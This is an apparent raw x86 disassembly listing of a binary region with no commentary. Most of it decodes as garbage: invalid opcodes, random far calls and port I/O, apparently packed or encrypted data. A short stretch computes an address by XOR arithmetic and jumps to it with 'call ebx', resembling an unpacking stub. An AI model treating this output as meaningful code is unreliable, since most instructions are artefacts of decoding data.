  40caf2:	push   cs
  40caf3:	mov    ch,0xd7
  40caf5:	dec    edx
  40caf6:	mov    WORD PTR [esi-0x261e0e7d],?
  40cafc:	push   esp
  40cafd:	mov    esi,0xb4ab7cce
  40cb02:	xor    al,0x5
  40cb04:	clc    
  40cb05:	pop    esi
  40cb06:	out    0x23,al
  40cb08:	(bad)  
  40cb09:	jmp    0x7bc3:0x7906a018
  40cb10:	(bad)  
  40cb11:	les    esp,FWORD PTR [edi-0x49a95dad]
  40cb17:	dec    ecx
  40cb18:	pop    esp
  40cb19:	pop    ebx
  40cb1a:	ret    
  40cb1b:	mov    eax,0xe33c3a12
  40cb20:	xor    DWORD PTR [eax-0x7c77232],esp
  40cb26:	les    ecx,FWORD PTR [esi-0x3d]
  40cb29:	dec    edi
  40cb2a:	xor    BYTE PTR [edi-0x57],bh
  40cb2d:	sub    BYTE PTR [esi-0x7e],ch
  40cb30:	sbb    BYTE PTR ds:0xcfd10f80,ch
  40cb36:	push   esi
  40cb37:	pop    edi
  40cb38:	fmul   st(5),st
  40cb3a:	pop    ds
  40cb3b:	xor    DWORD PTR [esi-0xecd6b19],ecx
  40cb41:	jg     0x40cacf
  40cb43:	ret    0xe2f1
  40cb46:	loopne 0x40cb97
  40cb48:	(bad)  
  40cb49:	cmp    bl,dl
  40cb4b:	add    esp,DWORD PTR cs:[eax-0x4c]
  40cb4f:	stc    
  40cb50:	xchg   esp,eax
  40cb51:	inc    edi
  40cb52:	adc    eax,DWORD PTR [ecx+0x288c9345]
  40cb58:	jb     0x40cb76
  40cb5a:	cs dec edi
  40cb5c:	xchg   ebx,eax
  40cb5d:	inc    edx
  40cb5e:	lods   al,BYTE PTR ds:[esi]
  40cb5f:	mov    ds:0x19924d0a,al
  40cb64:	mov    WORD PTR [ebx+0x29820ce6],ds
  40cb6a:	pop    ss
  40cb6b:	ficom  DWORD PTR [ebx]
  40cb6d:	cld    
  40cb6e:	xchg   edi,eax
  40cb6f:	std    
  40cb70:	jbe    0x40cbbb
  40cb72:	adc    eax,0x31a66171
  40cb77:	(bad)  
  40cb78:	call   0x12a33b73
  40cb7d:	jmp    0xc5b53e06
  40cb82:	jo     0x40cb82
  40cb84:	and    dh,BYTE PTR ds:0x8a6dabc3
  40cb8a:	dec    ecx
  40cb8b:	icebp  
  40cb8c:	nop
  40cb8d:	ss pop eax
  40cb8f:	sti    
  40cb90:	icebp  
  40cb91:	out    dx,al
  40cb92:	jmp    0x40cbac
  40cb94:	and    BYTE PTR [eax-0x50f039fd],0x2
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0xe]
  40cbfc:	retf   
  40cbfd:	dec    ebp
  40cbfe:	push   ds
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cb94
  40cc08:	into   
  40cc09:	pop    esp
  40cc0a:	pop    esi
  40cc0b:	ins    BYTE PTR es:[edi],dx
  40cc0c:	fst    DWORD PTR [ecx+0x42]
  40cc0f:	xchg   edx,eax
  40cc10:	mov    dl,0x89
  40cc12:	sar    BYTE PTR [ecx],cl
  40cc14:	lea    eax,[edi-0x59ef22de]
  40cc1a:	cmp    ebx,DWORD PTR [eax+eax*8+0x33755cfb]
  40cc21:	push   ds
  40cc22:	gs push edx
  40cc24:	inc    eax
  40cc25:	mov    ds:0x1d505ca4,eax
  40cc2a:	stos   DWORD PTR es:[edi],eax
  40cc2b:	cmp    ecx,DWORD PTR [edi+0x55d0e645]
  40cc31:	xlat   BYTE PTR ds:[ebx]
  40cc32:	out    dx,eax
  40cc33:	cmp    BYTE PTR [eax+0x6d7eb01e],dl
  40cc39:	jge    0x40cc06
  40cc3b:	add    al,0x4e
  40cc3d:	add    BYTE PTR [ecx],0x34
  40cc40:	lods   eax,DWORD PTR ds:[esi]
  40cc41:	sub    BYTE PTR [ebx-0x18c4179f],dl
  40cc47:	ds fwait
  40cc49:	aaa    
  40cc4a:	push   ss
  40cc4b:	mov    al,0xec
  40cc4d:	and    ch,bl
  40cc4f:	fild   QWORD PTR [edi-0x51]
  40cc52:	add    ch,bh
  40cc54:	aam    0xa4
  40cc56:	push   ebp
  40cc57:	adc    ebp,DWORD PTR [eax-0x271b092d]
  40cc5d:	daa    
  40cc5e:	into   
  40cc5f:	xor    DWORD PTR [eax+0x517793cd],ebx
  40cc65:	push   edi
  40cc66:	inc    edi
  40cc67:	cdq    
  40cc68:	xadd   ebx,ecx
  40cc6b:	jns    0x40cc34
  40cc6d:	rcr    DWORD PTR [edx+eax*4-0x63],1
  40cc71:	cmp    DWORD PTR [edi+0x25],esp
  40cc74:	fst    DWORD PTR [esi-0xe]
  40cc77:	gs pop es
  40cc79:	xor    ebx,edx
  40cc7b:	jae    0x40cc45
  40cc7d:	pop    edi
  40cc7e:	inc    ecx
  40cc7f:	int3   
  40cc80:	mov    al,ah
  40cc82:	stos   DWORD PTR es:[edi],eax
  40cc83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc84:	retf   0x28b0
  40cc87:	pop    ebp
  40cc88:	mov    ecx,0xb1810c49
  40cc8d:	cs dec esi
  40cc8f:	xchg   esp,eax
  40cc90:	lods   al,BYTE PTR ds:[esi]
  40cc91:	stc    
  40cc92:	cmp    al,0xa2
  40cc94:	push   0xd5b75361
  40cc99:	lds    ecx,FWORD PTR [ebx-0x199eb43f]
  40cc9f:	sbb    BYTE PTR [edx+0x38],ah
  40cca2:	pop    ss
  40cca3:	std    
  40cca4:	mov    bl,0xa1
  40cca6:	stc    
  40cca7:	adc    ch,BYTE PTR [ebx+0x5b0672d0]
  40ccad:	inc    ecx
  40ccae:	int3   
  40ccaf:	xor    ecx,DWORD PTR [edi-0x75]
  40ccb2:	aad    0xda
  40ccb4:	xchg   ebp,eax
  40ccb5:	or     DWORD PTR [esi+0x2f],0x852038e6
  40ccbc:	mov    al,0x4f
  40ccbe:	and    esp,DWORD PTR [esi+0x1c]
  40ccc1:	test   al,0xbd
  40ccc3:	push   cs
  40ccc4:	xor    ah,al
  40ccc6:	(bad)
  40ccc9:	adc    eax,0x58ae789a
  40ccce:	jmp    0x60cf5b2d
  40ccd3:	rcr    BYTE PTR [edx+ebp*8-0x5],0x88
  40ccd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd9:	pushf  
  40ccda:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccdc:	std    
  40ccdd:	stos   DWORD PTR es:[edi],eax
  40ccde:	mov    ds,WORD PTR [esi]
  40cce0:	fwait
  40cce1:	imul   esi,edx,0xffffffae
  40cce4:	mov    ecx,0xb5f133dd
  40cce9:	mov    dh,0x92
  40cceb:	sbb    BYTE PTR [ebx-0x7],0xb
  40ccef:	cld    
  40ccf0:	xchg   esi,eax
  40ccf1:	scas   al,BYTE PTR es:[edi]
  40ccf2:	icebp  
  40ccf3:	add    eax,0xca55aaf5
  40ccf8:	retf   
  40ccf9:	sbb    edx,ebx
  40ccfb:	jo     0x40ccf9
  40ccfd:	mov    WORD PTR [ebx],ds
  40ccff:	inc    bh
  40cd01:	xor    edx,DWORD PTR [edi]
  40cd03:	xchg   ecx,eax
  40cd04:	test   al,0xe6
  40cd07:	stos   BYTE PTR es:[edi],al
  40cd08:	sbb    esp,ebx
  40cd0a:	cld    
  40cd0b:	outs   dx,BYTE PTR ds:[esi]
  40cd0c:	mov    ebx,0xf21801af
  40cd11:	pushf  
  40cd12:	mov    ebx,0xdc3c68ee
  40cd17:	or     DWORD PTR [eax],0x7c
  40cd1a:	outs   dx,BYTE PTR ds:[esi]
  40cd1b:	sub    BYTE PTR [esi],ch
  40cd1d:	dec    ecx
  40cd1e:	retf   0xa8a1
  40cd21:	adc    al,0x2e
  40cd23:	pop    ebp
  40cd24:	and    al,0xb6
  40cd26:	add    eax,0xe0c02631
  40cd2b:	loopne 0x40cd6a
  40cd2d:	push   edx
  40cd2e:	pop    eax
  40cd2f:	into   
  40cd30:	test   DWORD PTR [ecx+eax*1],edx
  40cd33:	retf   0xdd3c
  40cd36:	mov    esi,DWORD PTR [edi-0x62]
  40cd39:	sbb    al,dl
  40cd3b:	daa    
  40cd3c:	inc    ecx
  40cd3d:	lahf   
  40cd3e:	mov    dh,0xf7
  40cd40:	adc    ebp,DWORD PTR [esp+esi*8-0x19260ae9]
  40cd47:	jge    0x40cd22
  40cd49:	sbb    ebp,DWORD PTR [ebx+0x1e83bca6]
  40cd4f:	push   ds
  40cd50:	retf   0x704e
  40cd53:	pop    esi
  40cd54:	pop    dx
  40cd56:	mov    ds:0x794952df,al
  40cd5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd5c:	pop    esp
  40cd5d:	mov    cl,0x6f
  40cd5f:	aam    0x3c
  40cd61:	das    
  40cd62:	mov    ebp,0xa70df655
  40cd67:	jnp    0x40cd10
  40cd69:	scas   eax,DWORD PTR es:[edi]
  40cd6a:	mov    ebx,0xb729bb28
  40cd6f:	inc    esp
  40cd70:	test   al,0xa2
  40cd72:	and    DWORD PTR [eax-0x28f034d8],edi
  40cd78:	adc    DWORD PTR [esi+0x2f],edx
  40cd7b:	push   ebp
  40cd7c:	ja     0x40cdf1
  40cd7e:	lods   al,BYTE PTR ds:[esi]
  40cd7f:	sbb    edi,ebp
  40cd81:	inc    esi
  40cd82:	pusha  
  40cd83:	adc    al,0xbb
  40cd85:	mov    edi,?
  40cd87:	fldcw  WORD PTR [ecx]
  40cd89:	cmp    edx,esp
  40cd8b:	shl    esi,1
  40cd8d:	sbb    esp,DWORD PTR [edx]
  40cd8f:	test   eax,0x959c3d95
  40cd94:	fidiv  WORD PTR [esi+0x31]
  40cd97:	and    eax,0xe1d5d7a5
  40cd9c:	aam    0xf
  40cd9e:	sti    
  40cd9f:	push   eax
  40cda0:	in     al,0xd0
  40cda2:	retf   0x8b0b
  40cda5:	popf   
  40cda6:	sti    
  40cda7:	call   0x69c6:0x4ba91f05
  40cdae:	or     DWORD PTR [esp+ecx*2],esp
  40cdb1:	sbb    eax,0x3f0fc756
  40cdb6:	or     BYTE PTR [ebx],bl
  40cdb8:	dec    ecx
  40cdb9:	hlt    
  40cdba:	mov    ebx,DWORD PTR [ecx]
  40cdbc:	(bad)  
  40cdbd:	xlat   BYTE PTR ds:[ebx]
  40cdbe:	loope  0x40ce31
  40cdc0:	xor    DWORD PTR [ebx+0xf],edi
  40cdc3:	xor    bl,bl
  40cdc5:	sahf   
  40cdc6:	ins    BYTE PTR es:[edi],dx
  40cdc7:	add    bh,BYTE PTR [edi]
  40cdc9:	cmp    al,0x75
  40cdcb:	sub    BYTE PTR [edi+ebx*8-0x59],0x12
  40cdd0:	push   esp
  40cdd1:	sbb    BYTE PTR [esi-0x78],ah
  40cdd4:	xchg   ecx,eax
  40cdd5:	cmp    dh,bl
  40cdd7:	addr16 ret 
  40cdd9:	or     al,0x17
  40cddb:	aas    
  40cddc:	pop    edi
  40cddd:	pop    ebx
  40cdde:	adc    edi,DWORD PTR [esi+0x5a]
  40cde1:	ins    DWORD PTR es:[edi],dx
  40cde2:	test   eax,0x33913dd4
  40cde7:	not    WORD PTR [edi]
  40cdea:	icebp  
  40cdeb:	rol    DWORD PTR [esi-0x66bb2361],0xb5
  40cdf2:	outs   dx,DWORD PTR ds:[esi]
  40cdf3:	push   ebx
  40cdf4:	add    al,ah
  40cdf6:	sbb    eax,DWORD PTR [edx]
  40cdf8:	add    dh,ah
  40cdfa:	in     al,0x6d
  40cdfc:	cs loopne 0x40ce52
  40cdff:	lods   eax,DWORD PTR ds:[esi]
  40ce00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce02:	sub    ebx,0xf94bd320
  40ce08:	jp     0x40cd8d
  40ce0a:	test   al,0xd5
  40ce0c:	or     ebx,ebx
  40ce0e:	pop    edx
  40ce0f:	cld    
  40ce10:	sar    BYTE PTR ds:0x129ecb21,1
  40ce16:	inc    BYTE PTR [edx]
  40ce18:	imul   esi,eax,0x37
  40ce1b:	stos   BYTE PTR es:[edi],al
  40ce1c:	jmp    0x8a54bf5b
  40ce21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce22:	and    DWORD PTR [edi+0x67],edi
  40ce25:	sub    esi,ebp
  40ce27:	fild   WORD PTR [esi]
  40ce29:	mov    ah,0x6a
  40ce2b:	pop    edx
  40ce2c:	arpl   bp,bx
  40ce2e:	call   0x3a1b:0x9ccc14ff
  40ce35:	or     ebp,DWORD PTR [ecx+0x2eb558b1]
  40ce3b:	aaa    
  40ce3c:	scas   eax,DWORD PTR es:[edi]
  40ce3d:	jge    0x40cdc9
  40ce3f:	das    
  40ce40:	mov    ds:0xed0bf6a6,eax
  40ce45:	pop    ebp
  40ce46:	(bad)  
  40ce47:	mov    ds:0xfb06e72b,al
  40ce4c:	and    ch,BYTE PTR [ebx]
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	and    DWORD PTR [eax+0x45],ebx
  40ce65:	dec    ebx
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	fidivr WORD PTR [edi+0x40]
  40ce71:	cmp    eax,0x1cdac006
  40ce76:	mov    ecx,DWORD PTR [eax]
  40ce78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce79:	cwde   
  40ce7a:	pop    ebx
  40ce7b:	add    BYTE PTR [esi+0x4ff4a4f3],dh
  40ce81:	jmp    0xd1b8affc
  40ce86:	mov    ecx,0x39b8be0b
  40ce8b:	cmp    edi,DWORD PTR [esi+0x4]
  40ce8e:	or     al,0xd0
  40ce90:	adc    cl,0x27
  40ce93:	push   esi
  40ce94:	test   al,0x3f
  40ce96:	xchg   BYTE PTR [ecx+0x1a93d24a],al
  40ce9c:	mov    al,ds:0x39cc7e5b
  40cea1:	add    esi,DWORD PTR [ecx-0x7]
  40cea4:	xor    ecx,DWORD PTR [ecx+0x650ff972]
  40ceaa:	xchg   esi,eax
  40ceab:	mov    WORD PTR [ebp-0x1b45b2e0],fs
  40ceb1:	pop    edi
  40ceb2:	adc    al,0xd1
  40ceb4:	mov    ebx,0xb80538af
  40ceb9:	xor    eax,0xf282a4c4
  40cebe:	aaa    
  40cebf:	cmc    
  40cec0:	out    dx,al
  40cec1:	mov    ah,0xa0
  40cec3:	xchg   edx,eax
  40cec4:	sbb    BYTE PTR [edi-0x52],0x40
  40cec8:	inc    ebp
  40cec9:	push   0x8bd3b33c
  40cece:	call   0x3b19:0x2eb3607c
  40ced5:	add    BYTE PTR [ecx+0x4e],bl
  40ced8:	or     eax,0x22a60320
  40cedd:	mov    DWORD PTR [ecx-0x3c],edi
  40cee0:	repnz cli 
  40cee2:	(bad)  
  40cee3:	jmp    0x965c5d2a
  40cee8:	test   BYTE PTR [edx-0x22],al
  40ceeb:	push   ds
  40ceec:	test   eax,0x1f16799
  40cef1:	dec    ebx
  40cef2:	and    eax,0x6dcf6a78
  40cef7:	fild   QWORD PTR [ebp-0x4c5ad75e]
  40cefd:	sbb    bl,bl
  40ceff:	ins    BYTE PTR es:[edi],dx
  40cf00:	loope  0x40cedd
  40cf02:	inc    esi
  40cf03:	push   cs
  40cf04:	pop    esi
  40cf05:	inc    edx
  40cf06:	scas   al,BYTE PTR es:[edi]
  40cf07:	pop    ecx
  40cf08:	inc    edx
  40cf09:	bound  esp,QWORD PTR [esi+0x6a]
  40cf0c:	cmc    
  40cf0d:	outs   dx,DWORD PTR ds:[esi]
  40cf0e:	sub    eax,0xb65a477a
  40cf13:	xchg   edi,eax
  40cf14:	jnp    0x40cef4
  40cf16:	ds push edi
  40cf18:	(bad)  [ebx+0x2d50723b]
  40cf1e:	outs   dx,BYTE PTR ds:[esi]
  40cf1f:	jno    0x40cf63
  40cf21:	mov    DWORD PTR [ebp+0x22],edi
  40cf24:	fwait
  40cf25:	call   0x82f0:0xfc8b11b2
  40cf2c:	fsubr  DWORD PTR [esi-0x21]
  40cf2f:	mov    cl,0xf1
  40cf31:	pop    DWORD PTR [edx-0x2f36f37f]
  40cf37:	rol    DWORD PTR [edi+0x48],1
  40cf3a:	jno    0x40cee9
  40cf3c:	sub    ebx,DWORD PTR [edi-0x64]
  40cf3f:	je     0x40cf3b
  40cf41:	xchg   edi,eax
  40cf42:	sbb    al,dl
  40cf44:	sbb    BYTE PTR [ecx],bh
  40cf46:	inc    edi
  40cf47:	sbb    al,0xe3
  40cf49:	inc    ecx
  40cf4a:	into   
  40cf4b:	mov    edi,0xa912aa75
  40cf50:	jne    0x40cf94
  40cf52:	and    DWORD PTR [ecx+esi*1-0x28],esi
  40cf56:	and    BYTE PTR cs:[esi-0x1d],0xbf
  40cf5b:	out    0x2b,eax
  40cf5d:	mov    al,0xd6
  40cf5f:	out    0x8d,eax
  40cf61:	imul   eax,DWORD PTR [ecx+ebx*4+0x5e1f2094],0xffffffb8
  40cf69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf6a:	sbb    al,0x3f
  40cf6c:	or     al,0xd5
  40cf6e:	gs (bad) 
  40cf70:	call   0xf318:0x48526cb4
  40cf77:	sahf   
  40cf78:	idiv   BYTE PTR [edx+0x7e4c39]
  40cf7e:	and    edi,ebp
  40cf80:	jns    0x40cf48
  40cf82:	mov    ds:0xa79cf206,eax
  40cf87:	imul   esp,DWORD PTR [ecx-0x3b719476],0xffffffe2
  40cf8e:	mov    eax,ds:0x979e5fbe
  40cf93:	(bad)  [ecx-0x4f]
  40cf96:	mov    ds,WORD PTR [ebp-0x35]
  40cf99:	inc    eax
  40cf9a:	inc    ecx
  40cf9b:	rol    al,0x18
  40cf9e:	and    al,0xb8
  40cfa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa1:	stos   DWORD PTR es:[edi],eax
  40cfa2:	jns    0x40d014
  40cfa4:	mov    bh,0xd3
  40cfa6:	mov    edx,0x5f9c5e73
  40cfab:	in     eax,0x33
  40cfad:	fsubr  st(3),st
  40cfaf:	jmp    0x3894:0x53a77442
  40cfb6:	popa   
  40cfb7:	pop    edx
  40cfb8:	frstor [ebx]
  40cfba:	xor    ah,BYTE PTR [ecx]
  40cfbc:	sub    ebp,0x194b96d9
  40cfc2:	call   0x4f0b001
  40cfc7:	int3   
  40cfc8:	xchg   ebx,eax
  40cfc9:	aaa    
  40cfca:	mov    ebp,0xfa13a145
  40cfcf:	sub    BYTE PTR [eax+0x2c3fd5d4],ch
  40cfd5:	push   cs
  40cfd6:	or     al,0xec
  40cfd8:	lahf   
  40cfd9:	cwde   
  40cfda:	and    eax,0xfff786cf
  40cfdf:	jecxz  0x40cff9
  40cfe1:	inc    esi
  40cfe2:	xlat   BYTE PTR ds:[ebx]
  40cfe3:	inc    esp
  40cfe4:	sti    
  40cfe5:	loope  0x40cfb8
  40cfe7:	out    dx,al
  40cfe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfe9:	and    ah,dh
  40cfeb:	lock push edx
  40cfed:	dec    esp
  40cfee:	enter  0x1cbf,0x76
  40cff2:	push   ecx
  40cff3:	retf   
  40cff4:	lds    ebp,FWORD PTR [ebp+0x53]
  40cff7:	repz fwait
  40cff9:	lods   eax,DWORD PTR ds:[esi]
  40cffa:	cmc    
  40cffb:	xchg   ebx,eax
  40cffc:	out    0xcd,al
  40cffe:	fsub   QWORD PTR [ecx+0x3f]
  40d001:	ret    
  40d002:	xor    ecx,DWORD PTR [eax]
  40d004:	mov    eax,0xbc2621da
  40d009:	clc    
  40d00a:	mov    ah,dh
  40d00c:	adc    DWORD PTR [edi],0xf
  40d00f:	sbb    eax,ecx
  40d011:	(bad)  
  40d012:	sub    esi,DWORD PTR ds:0xfb247903
  40d018:	(bad)  
  40d019:	mov    al,ds:0x8809a977
  40d01e:	sub    BYTE PTR [edx-0x61],0x74
  40d022:	jmp    0x3098279d
  40d027:	mov    cl,0x1e
  40d029:	mov    cl,0x6c
  40d02b:	push   esi
  40d02c:	test   ch,dh
  40d02e:	rol    DWORD PTR [esi+0x22],1
  40d031:	pusha  
  40d032:	test   BYTE PTR [edi-0x63bc4834],bl
  40d038:	shl    ah,1
  40d03a:	push   edx
  40d03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d03c:	xchg   ecx,eax
  40d03d:	ins    BYTE PTR es:[edi],dx
  40d03e:	or     eax,0xa98f46aa
  40d043:	xchg   ebp,eax
  40d044:	cmp    edi,DWORD PTR [esi]
  40d046:	loope  0x40d01f
  40d048:	ficom  WORD PTR [eax+ebx*8-0x1c]
  40d04c:	(bad)  
  40d04e:	pop    ebp
  40d04f:	dec    esi
  40d050:	iret   
  40d051:	push   esp
  40d052:	ins    BYTE PTR es:[edi],dx
  40d053:	in     eax,dx
  40d054:	pop    esp
  40d055:	xor    BYTE PTR [eax-0x12],dh
  40d058:	xor    cl,al
  40d05a:	cmp    ebx,edx
  40d05c:	sub    al,BYTE PTR [edx+0x40d43994]
  40d062:	add    al,0xb8
  40d064:	aam    0x17
  40d066:	out    0x43,eax
  40d068:	retf   0x6a6a
  40d06b:	sub    DWORD PTR [edx+edx*1-0x21],edx
  40d06f:	adc    DWORD PTR [ecx+0x24],0xffffffc5
  40d073:	pop    esp
  40d074:	(bad)  [ebx-0x23]
  40d077:	std    
  40d078:	dec    edi
  40d079:	dec    ecx
  40d07a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d07c:	add    BYTE PTR [esi+0x21],ch
  40d07f:	and    ah,BYTE PTR ds:0x8312eb7f
  40d085:	call   0xa27e:0xf8f146cb
  40d08c:	pushf  
  40d08d:	mov    bl,0x8
  40d08f:	adc    ecx,edx
  40d091:	ins    BYTE PTR es:[edi],dx
  40d092:	xchg   ebx,eax
  40d093:	adc    DWORD PTR [edi+0x416119e3],ecx
  40d099:	jbe    0x40d040
  40d09b:	pop    esp
  40d09c:	mov    dl,0xd6
  40d09e:	daa    
  40d09f:	jne    0x40d100
  40d0a1:	loopne 0x40d0fe
  40d0a3:	rcr    bl,0xc7
  40d0a6:	addr16 pop es
  40d0a8:	fwait
  40d0a9:	lock and al,0x1d
  40d0ac:	pop    esi
  40d0ad:	sub    eax,0xbff7143e
  40d0b2:	xchg   ebp,eax
  40d0b3:	aas    
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	shr    dh,0x6b
  40d0d2:	adc    esi,esi
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	pop    es
  40d0dc:	jae    0x40d0a1
  40d0de:	push   ss
  40d0df:	mov    eax,0xeb346c7
  40d0e4:	add    DWORD PTR [ecx+edx*1-0x4966528b],edi
  40d0eb:	sbb    eax,0x955a1328
  40d0f0:	cmp    eax,0xa574a4f
  40d0f5:	adc    DWORD PTR [eax+ebp*8+0x6eb52d6e],ecx
  40d0fc:	inc    esi
  40d0fd:	mov    ah,BYTE PTR [edi-0x7c]
  40d100:	mov    BYTE PTR [eax-0x6],bl
  40d103:	xor    al,bh
  40d105:	ja     0x40d0f1
  40d107:	data16 daa 
  40d109:	dec    ebp
  40d10a:	shl    DWORD PTR [ecx+0x4a29127e],0xc0
  40d111:	dec    edi
  40d112:	xchg   esp,eax
  40d113:	out    0x86,al
  40d115:	push   esi
  40d116:	sub    ecx,ebx
  40d118:	push   0x4a2220a9
  40d11d:	je     0x40d0cd
  40d11f:	mov    al,ds:0x719aa155
  40d124:	mov    bl,BYTE PTR [ebp+0x1e]
  40d127:	packsswb mm7,QWORD PTR [edx+ebx*2]
  40d12b:	jecxz  0x40d18e
  40d12d:	lods   eax,DWORD PTR ds:[esi]
  40d12e:	inc    eax
  40d12f:	xor    bl,0xbd
  40d132:	mov    ecx,0x2ed9d71
  40d137:	out    dx,al
  40d138:	retf   
  40d139:	xor    esp,DWORD PTR [ecx]
  40d13b:	leave  
  40d13c:	sub    DWORD PTR [edx-0x66231773],edx
  40d142:	adc    eax,0x5b0aa53e
  40d147:	ret    0x112b
  40d14a:	sbb    eax,0xa73b1ccf
  40d14f:	xchg   esp,eax
  40d150:	(bad)  
  40d151:	jp     0x40d1c1
  40d153:	test   eax,0xf772635d
  40d158:	(bad)
  40d15b:	mov    ds:0x8384bdb1,al
  40d160:	lods   al,BYTE PTR ds:[esi]
  40d161:	shl    BYTE PTR [esi+edi*8-0x27515c89],cl
  40d168:	inc    ebx
  40d169:	out    0xcd,eax
  40d16b:	out    dx,al
  40d16c:	pop    es
  40d16d:	mov    al,ds:0x33b405ce
  40d172:	cmc    
  40d173:	clc    
  40d174:	fdivr  DWORD PTR [edx]
  40d176:	inc    edi
  40d177:	repnz mov eax,ds:0x217c5ccd
  40d17d:	jle    0x40d163
  40d17f:	test   al,0x82
  40d181:	sti    
  40d182:	cwde   
  40d183:	imul   edi,eax,0xb6fa8a30
  40d189:	sahf   
  40d18a:	xor    bh,BYTE PTR [eax+0x3e]
  40d18d:	dec    ebp
  40d18e:	mov    edx,0xfa36da85
  40d193:	jnp    0x40d1ef
  40d195:	retf   
  40d196:	sub    al,0xb3
  40d198:	scas   eax,DWORD PTR es:[edi]
  40d199:	mov    eax,ds:0x1741ac2a
  40d19e:	daa    
  40d19f:	mov    ebp,0x961c4a22
  40d1a4:	daa    
  40d1a5:	imul   edx,DWORD PTR [eax+0x34],0xffffffc3
  40d1a9:	jecxz  0x40d208
  40d1ab:	outs   dx,BYTE PTR ds:[esi]
  40d1ac:	jmp    0x40d204
  40d1ae:	dec    ecx
  40d1af:	mov    ds:0x5f82ee22,eax
  40d1b4:	pop    eax
  40d1b5:	addr16 es jmp 0x40d13e
  40d1b9:	and    al,0x37
  40d1bb:	imul   esi,DWORD PTR [esi+edi*8],0x62
  40d1bf:	mov    esp,0x6d72dba3
  40d1c4:	jle    0x40d17f
  40d1c6:	dec    ebp
  40d1c7:	sahf   
  40d1c8:	mov    cl,0x2f
  40d1ca:	lock mov ch,BYTE PTR [ebx-0x6dbe8961]
  40d1d1:	pop    edx
  40d1d2:	into   
  40d1d3:	loop   0x40d1a7
  40d1d5:	pop    ds
  40d1d6:	mov    ebx,0x12e24ac8
  40d1db:	add    BYTE PTR [eax],cl
  40d1dd:	mov    al,0xe6
  40d1df:	shl    BYTE PTR [ebx+eax*1-0x3aebc567],1
  40d1e6:	sub    BYTE PTR [ebx+esi*2],ch
  40d1e9:	cmp    al,BYTE PTR [edx-0x22]
  40d1ec:	dec    edx
  40d1ed:	or     DWORD PTR [ecx+0x1b95dfb2],ecx
  40d1f3:	pop    ebx
  40d1f4:	xor    BYTE PTR [ebp+edi*1-0x6c00d70b],dl
  40d1fb:	je     0x40d1cf
  40d1fd:	add    ch,BYTE PTR [eax+0x2e0538ad]
  40d203:	(bad)  
  40d204:	shl    DWORD PTR [eax+eax*4-0x4216860e],cl
  40d20b:	(bad)
  40d20e:	sub    eax,esp
  40d210:	xor    eax,0xbaba23c8
  40d215:	retf   
  40d216:	or     ecx,edx
  40d218:	sbb    dh,dh
  40d21a:	push   edi
  40d21b:	in     al,0xfc
  40d21d:	imul   edi,ecx,0x9620a8af
  40d223:	mov    esi,0xf6a4dfb9
  40d228:	mov    ah,0x3b
  40d22a:	inc    eax
  40d22b:	mov    ah,BYTE PTR [ebx-0x36]
  40d22e:	ins    BYTE PTR es:[edi],dx
  40d22f:	push   ebp
  40d230:	inc    esi
  40d231:	add    BYTE PTR [ecx],dh
  40d233:	test   edx,esi
  40d235:	mov    al,ds:0x5f11ecac
  40d23a:	out    0x13,eax
  40d23c:	ret    0x43ce
  40d23f:	psubq  mm1,mm1
